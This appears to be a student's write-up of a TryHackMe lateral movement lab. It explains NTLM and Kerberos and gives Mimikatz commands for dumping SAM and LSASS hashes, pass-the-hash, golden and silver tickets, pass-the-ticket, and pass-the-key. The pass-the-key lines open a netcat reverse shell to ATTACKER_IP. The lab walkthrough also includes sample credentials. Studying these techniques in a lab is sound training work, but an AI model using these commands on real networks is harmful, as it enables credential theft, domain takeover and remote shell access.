# Use of Alternate Authentication Material

The title refers to any piece of data that can be used to access a Windows account without actually knowing a user's password itself.

***

### <mark style="color:green;">NTLM Authentication</mark>

{% tabs %}
{% tab title="Local Account" %}
<figure><img src="../../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

The process here is simply a client wanting to access a server. The key here is the NTLM response where the client's NTLM password hash with the challenge is sent to the server for verification.
{% endtab %}

{% tab title="Domain Account" %}
<figure><img src="../../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

Over here we have the same thing but for domain accounts, the verification requires interaction from the domain controller where the SAM is stored.
{% endtab %}
{% endtabs %}

***

### <mark style="color:green;">Pass-the-Hash</mark>

<figure><img src="../../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

Pass-the-hash simply means passing the hash as it is. It also means we can authenticate without requiring the plaintext password to be known. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can **Pass-the-Hash** (PtH) and authenticate successfully.

To extract NTLM hashes, we can either use Mimikatz to read the local SAM or extract hashes directly from Local Security Authority Subsystem Service(LSASS) memory.

**Extracting NTLM hashes from local SAM:**

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
  
### This extracts hashes from local users on the machine
```

**Extracting NTLM hashes from LSASS memory:**

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484

### This extracts hashes from local users and any domain user that has logged onto the machine
```

After extracting the NTLM hashes we can pass it using some of the methods below:

RDP:

```bash
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

Psexec:

```bash
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

WinRM

```bash
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

***

### <mark style="color:green;">Kerberos Authentication</mark>

<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

{% stepper %}
{% step %}
#### AS-REQ (Authentication Service Request)

The client requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC)&#x20;
{% endstep %}

{% step %}
#### AS-REP (Authentication Service Reply)

The KDC verifies the client and sends back an encrypted TGT & session key
{% endstep %}

{% step %}
#### TGS-REQ (Ticket Granting Service Request)

The client sends the encrypted TGT to the TGS with Service Principal Name (SPN) of the service that client wants to access
{% endstep %}

{% step %}
#### TGS-REP (Ticket Granting Service Reply)

The KDC verifies the TGT and sends a Service Ticket with a session key
{% endstep %}

{% step %}
#### AP-REQ (Application Service Request)

The client requests the services and sends the session key to prove access
{% endstep %}

{% step %}
#### AP-REP (Application Service Reply)

The service grants access
{% endstep %}
{% endstepper %}

***

### <mark style="color:green;">Golden Ticket vs Silver Ticket</mark>

{% tabs %}
{% tab title="Golden Ticket" %}
<figure><img src="../../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

* Can access **any** Kerberos service and impersonate any user (Full domain compromise)
* Dump the **KRBTGT** account NTLM hash
* Forge the **TGT**&#x20;

**Dumping the krbtgt hash:**

`lsadump::lsa /inject /name:krbtgt`

**Creating Golden Ticket:**

`Kerberos::golden /user:administrator /domain:<DOMAIN.local> /sid: <DOMAIN_SID>: /krbtgt:<KRBTGT_HASH> /id:500`

\*\*\*Note: The KRBTGT account is used by the KDC to encrypt and sign TGTs
{% endtab %}

{% tab title="Silver Ticket" %}
<figure><img src="../../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

* Can access only a **targeted** service
* To stay undetected
* Dump the **Service Account (SA)** NTLM hash
* Forge **TGS**

**Dumping the SA hash:**

`lsadump::lsa /inject /name:<SERVICE>`

**Creating Silver Ticket:**

`Kerberos::golden /user:Administrator /domain:<DOMAIN.local> /sid: <domain_sid> /rc4:<ServiceAccount_hash> /id:1103`
{% endtab %}
{% endtabs %}

***

### <mark style="color:green;">Pass-the-Ticket</mark>

It is a type of Kerberos attack where the attacker reuses a valid TGT or TGS to access the system without knowing the user’s password. It can be extracted from the LSASS memory using Mimikatz:

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:

```powershell
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Check if the tickets were correctly injected using klist:

```powershell
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

***

### <mark style="color:green;">Overpass-the-hash / Pass-the-Key</mark>

This kind of attack is similar to PtH but applied to Kerberos networks.

When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name **Pass-the-key (PtK)**.

We can obtain the Kerberos encryption keys from LSASS using Mimikatz:

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

We can run these commands to get a reverse shell via Pass-the-Key using `nc64.exe`

RC4 hash:

```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

AES128 hash:

```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

AES256 hash:

```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

\*\*\* Bonus: RC4 keys are equal to the NTLM hash of a user, meaning we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as **Overpass-the-Hash (OPtH)**

***

***

<figure><img src="../../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

## Task 3

Similar to the previous task, we need to move laterally from THMJMP2 to THMII but this time using the techniques above . Initial credentials are given (assume we captured with admin access). These credentials grant admin access allowing to use Mimikatz.

User: `ZA.TRYHACKME.COM\t2_felicia.dean`

Password: `iLov3THM!`

***

SSH to the credentials above

<figure><img src="../../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

I am chossing to use the Pass-the-Hash (PtH) technique, I dumped the hash keys using Mimikatz

<figure><img src="../../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

Find the target user which is `t1_toby.beck`

<figure><img src="../../../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

There are two available keys to use which is AES256 and RC4. I choose to pass the RC4 hash key. Before that start a listener first.

<figure><img src="../../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

Pass the RC4 Hash

```powershell
mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN_NAME> /rc4:<HASH> /run:"c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> <ATTACKER PORT>"
```

<figure><img src="../../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

Callback received and the target's credentials are injected and loaded

<figure><img src="../../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

Use Windows Remote Shell (winrs) to connect to the cmd of THMIIS

```powershell
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

Successful pivot from THMJMP2 to THMIIS

<figure><img src="../../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

Get flag

<figure><img src="../../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>
